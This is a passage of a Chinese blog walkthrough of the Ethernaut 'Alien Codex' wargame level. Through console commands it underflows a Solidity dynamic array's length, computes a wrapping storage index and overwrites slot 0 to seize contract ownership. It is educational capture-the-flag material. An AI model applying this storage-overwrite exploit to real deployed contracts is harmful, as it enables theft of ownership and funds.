codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] &#x3D; _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：获得合约所有权。</p><p>乍一看上去，没有修改合约所有权的函数，实际上，该合约继承了<code>Ownable</code>合约，该合约可以<a href="https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol" target="_blank" rel="noopener">【此】</a>查看，实际上，就算我们不查看该合约，我们也可以依次在控制台输入一下代码，查看相关存储布局：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br><span class="line"><span class="keyword">await</span> contract.make_contact()</span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"0"</span>)</span><br></pre></td></tr></table></figure><p>就会发现，实际上该合约的存储结构中，第一个<code>slot</code>的布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">|      unused(11)      |contact(1) |        owner (20)       | &lt;- slot 0</span><br><span class="line">--------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>再次查看<code>revise</code>函数，支持写入<code>codex</code>的某个位置，我们还注意到<code>retract</code>函数，是直接将动态长度减去1，实际上<code>slodity</code>这里并没有对动态数组长度做<strong>溢出检查</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.retract()</span><br><span class="line">await web3.eth.getStorageAt(instance, &quot;1&quot;)</span><br><span class="line"># return &#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span><br></pre></td></tr></table></figure><blockquote><p>slot 1 存储的是动态数组codex的长度，关于动态数组中元素的位置，参照<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官网文档-状态变量在储存中的布局】</a></p></blockquote><p>由于我们的<code>codex</code>变量目前是和<code>slot 1</code>相关联，而动态数组的元素存储位置会从 <code>keccak256(p)</code> 开始，<code>p</code>是<code>slot index</code>，本关卡是1，此外， 它的布局方式与静态大小的数组相同。一个元素接着一个元素。</p><p>我们借助remix，写个计算<code>keccak256</code>的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function keccak256Helper(uint p) public pure returns(bytes32 res) &#123;</span><br><span class="line">        res &#x3D; keccak256(abi.encodePacked(p));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keccak256(1)&#x3D;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure><p>该地址即为<code>codex</code>中元素的起始地址</p><p>借助<code>python</code>，我们可以计算一个偏移地址，使得偏移后的地址指向0，即：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex(<span class="number">2</span>**<span class="number">256</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br><span class="line">             <span class="number">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</span></span><br></pre></td></tr></table></figure><p>我们调用<code>revise</code>函数，并将偏移地址设置成上述地址：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.revise(<span class="string">'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'</span>, <span class="string">'0x000000000000000000000000'</span> + player.substr(<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>然后我们可以确认我们已经成功获得所有权：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner() == player</span><br></pre></td></tr></table></figure></div><div class="reward-container"><div>假如对您有所帮助，那就请我喝咖啡吧~~</div> <button onclick='var qr=document.getElementById("qr");qr.style.display="none"===qr.style.display?"block":"none"'> 打赏</button><div id="qr" style="display:none"><div style="display:inline-block"> <img src="/images/WeChat.png" alt="YaleXin 微信支付"><p>微信支付</p></div><div style="display:inline-block"> <img src="/images/Alipay.jpg" alt="YaleXin 支付宝"><p>支付宝</p></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/Solidity/" rel="tag"><i class="fa fa-tag"></i> Solidity</a><a href="/tags/Web3-0/" rel="tag"><i class="fa fa-tag"></i> Web3.0</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2023/03/04/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8A%E7%AF%87/" rel="prev" title="【Ethernaut闯关录】上篇"><i class="fa fa-chevron-left"></i> 【Ethernaut闯关录】上篇</a></div><div class="post-nav-item"> <a href="/2023/03/31/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8B%E7%AF%87/" rel="next" title="【Ethernaut闯关录】下篇">【Ethernaut闯关录】下篇<i class="fa fa-chevron-right"></i></a></div></div></footer></article><div><div><div style="text-align:center;color:#ccc;font-size:14px">------ 文章结束------</div></div></div></div></div><script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc"> 文章目录</li><li class="sidebar-nav-overview"> 站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Re-entrancy"><span class="nav-number">1.</span> <span class="nav-text">Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Elevator"><span class="nav-number">2.</span> <span class="nav-text">Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privacy"><span class="nav-number">3.</span> <span class="nav-text">Privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gatekeeper-One"><span class="nav-number">4.</span> <span class="nav-text">Gatekeeper One</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gatekeeper-Two"><span class="nav-number">5.</span> <span class="nav-text">Gatekeeper Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Naught-Coin"><span class="nav-number">6.</span> <span class="nav-text">Naught Coin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Preservation"><span class="nav-number">7.</span> <span class="nav-text">Preservation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recovery"><span class="nav-number">8.</span> <span class="nav-text">Recovery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MagicNumber"><span class="nav-number">9.</span> <span class="nav-text">MagicNumber</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Alien-Codex"><span class="nav-number">10.</span> <span class="nav-text">Alien Codex</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="YaleXin" src="/uploads/cat_mouse.jpg"><p class="site-author-name" itemprop="name">YaleXin</p><div class="site-description" itemprop="description">学渣一枚</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">118</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/"><span class="site-state-item-count">13</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/"><span class="site-state-item-count">107</span> <span class="site-state-item-name">标签</span></a></div></nav></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; 2020 – <span itemprop="copyrightYear">2023</span><span class="with-love"><i class="fa fa-fas fa-heartbeat"></i></span> <span class="author" itemprop="copyrightHolder">YaleXin</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span title="站点总字数">391k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span title="站点阅读时长">5:56</span></div> <span>本站已在此等候您 <span id="dnum" style="color:#35b8ff">0</span> 天</span> <span><span id="hnum" style="color:#35b8ff">0</span> 小时 <span id="mnum" style="color:#35b8ff">0</span> 分 <span id="snum" style="color:#35b8ff">0</span> 秒</span><script>var now=new Date;function createtime(){var n=new Date("02/21/2020 11:30:00");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("dnum").innerHTML=dnum,document.getElementById("hnum").innerHTML=hnum,document.getElementById("mnum").innerHTML=mnum,document.getElementById("snum").innerHTML=snum}setInterval("createtime()",250)</script><div class="powered-by"> <span>powered by</span> <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i></span> <span class="site-uv" title="总访客量"><span>总访客量：</span><span id="busuanzi_value_site_uv"></span></span></span> <span class="post-meta-divider">|</span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="site-pv" title="总访问量"><span>总访问量：</span><span id="busuanzi_value_site_pv"></span></span></span></div><script>
  function leancloudSelector(url) {
    url = encodeURI(url);
    return document.getElementById(url).querySelector('.leancloud-visitors-count');
  }
  if (CONFIG.page.isPost) {
    function addCount(Counter) {
      var visitors = document.querySelector('.leancloud_visitors');
      var url = decodeURI(visitors.getAttribute('id'));
      var title = visitors.getAttribute('data-flag-title');

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length > 0) {
            var counter = results[0];
            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
              .then(response => response.json())
              .then(() => {
                leancloudSelector(url).innerText = counter.time + 1;
              })
              .catch(error => {
                console.error('Failed to save visitor count', error);
              })
          } else {
              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
                .then(response => response.json())
                .then(() => {
                  leancloudSelector(url).innerText = 1;
                })
                .catch(error => {
                  console.error('Failed to create', error);
                });
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }
  } else {
    function showTime(Counter) {
      var visitors = document.querySelectorAll('.leancloud_visitors');
      var entries = [...visitors].map(element => {
        return decodeURI(element.getAttribute('id'));
      });

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length === 0) {
            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
              element.innerText = 0;
            });
            return;
          }
          for (let item of results) {
            let { url, time } = item;
            leancloudSelector(url).innerText = time;
          }
          for (let url of entries) {
            var element = leancloudSelector(url);
            if (element.innerText == '') {
              element.innerText = 0;
            }
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }
  }

  fetch('https://app-router.leancloud.cn/2/route?appId=CjaKbRAizU0DNH3B4Hllhtwp-gzGzoHsz')
    .then(response => response.json())
    .then(({ api_server }) => {
      var Counter = (method, url, data) => {
        return fetch(`https://${api_server}/1.1${url}`, {
          method: method,
          headers: {
            'X-LC-Id'     : 'CjaKbRAizU0DNH3B4Hllhtwp-gzGzoHsz',
            'X-LC-Key'    : 'B61jy2Xnwe90oJ2dtUeF6HHU',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      if (CONFIG.page.isPost) {
        if (CONFIG.hostname !== location.hostname) return;
        addCount(Counter);
      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
        showTime(Counter);
      }
    });
  </script></div></footer></div><script src="/lib/anime.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script></body></html>